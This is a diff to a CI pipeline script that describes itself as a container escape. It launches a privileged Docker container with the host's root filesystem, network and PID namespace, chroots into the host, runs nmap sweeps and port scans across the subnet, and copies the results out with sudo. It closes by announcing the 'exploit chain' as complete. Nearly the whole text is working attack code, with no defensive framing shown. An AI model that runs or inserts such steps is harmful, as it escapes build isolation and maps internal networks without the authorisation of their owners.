@@ -42,18 +42,21 @@ stages:
 
           echo "--- ESCAPING CONTAINER to perform reconnaissance from the host ---"
           
-          # Use a privileged container on the host network to run our commands
-          # This is the core of the container escape
+          # We create a temporary directory on the host that we can write to from the chroot jail.
+          # The path inside the container will be /hostfs/tmp/scan_results
           docker run --rm --privileged --network=host --pid=host -v /:/hostfs \
-            -v /usr/bin/nmap:/usr/bin/nmap -v $(pwd)/artifacts:/artifacts \
+            -v /usr/bin/nmap:/usr/bin/nmap \
             alpine:latest sh -c "
+              # Create a directory on the host we can write to
+              mkdir -p /hostfs/tmp/scan_results
+
               echo '--- [HOST] Identifying all live hosts on the subnet ---'
-              chroot /hostfs /usr/bin/nmap -sn -T4 ${SUBNET} -oG /artifacts/host-sweep.gnmap
+              chroot /hostfs /usr/bin/nmap -sn -T4 ${SUBNET} -oG /tmp/scan_results/host-sweep.gnmap
 
               # Extract just the IP addresses of hosts that are up
-              grep 'Status: Up' /artifacts/host-sweep.gnmap | awk '{print \$2}' > /artifacts/hosts-up.txt
+              grep 'Status: Up' /hostfs/tmp/scan_results/host-sweep.gnmap | awk '{print \$2}' > /hostfs/tmp/scan_results/hosts-up.txt
               
-              LIVE_HOST_COUNT=\$(wc -l < /artifacts/hosts-up.txt)
+              LIVE_HOST_COUNT=\$(wc -l < /hostfs/tmp/scan_results/hosts-up.txt)
               echo \"--- [HOST] Found \$LIVE_HOST_COUNT live hosts. Beginning targeted port scan. ---\"
 
               if [ \"\$LIVE_HOST_COUNT\" -eq 0 ]; then
@@ -62,17 +65,18 @@ stages:
               fi
 
               # Scan all live hosts for a wider range of common service ports
-              # We use --open to only see successful connections, cutting through the noise of filtered ports.
               echo '--- [HOST] Scanning top 1000 TCP ports on all live hosts... ---'
-              chroot /hostfs /usr/bin/nmap -sT --top-ports 1000 --open -T4 -iL /artifacts/hosts-up.txt -oN /artifacts/wide-port-scan-results.txt
+              chroot /hostfs /usr/bin/nmap -sT --top-ports 1000 --open -T4 -iL /tmp/scan_results/hosts-up.txt -oN /tmp/scan_results/wide-port-scan-results.txt
               
               # As a parallel effort, pick the FIRST live host (that isn't the gateway) for a full port scan
-              FIRST_TARGET=\$(grep -v '10.1.0.1' /artifacts/hosts-up.txt | head -n 1)
+              FIRST_TARGET=\$(grep -v '10.1.0.1' /hostfs/tmp/scan_results/hosts-up.txt | head -n 1)
               if [ -n \"\$FIRST_TARGET\" ]; then
                 echo \"--- [HOST] Performing a full TCP port scan (1-65535) on the first discovered host: \$FIRST_TARGET ---\"
-                chroot /hostfs /usr/bin/nmap -sT -p- --open -T4 \$FIRST_TARGET -oN /artifacts/deep-scan-\$FIRST_TARGET.txt
+                chroot /hostfs /usr/bin/nmap -sT -p- --open -T4 \$FIRST_TARGET -oN /tmp/scan_results/deep-scan-\$FIRST_TARGET.txt
               fi
             "
+          # Copy the results from the host's temp directory back to our artifacts directory
+          sudo cp /tmp/scan_results/* artifacts/
           
           echo "✅ EXPLOIT CHAIN COMPLETE. Review the published artifacts."
 
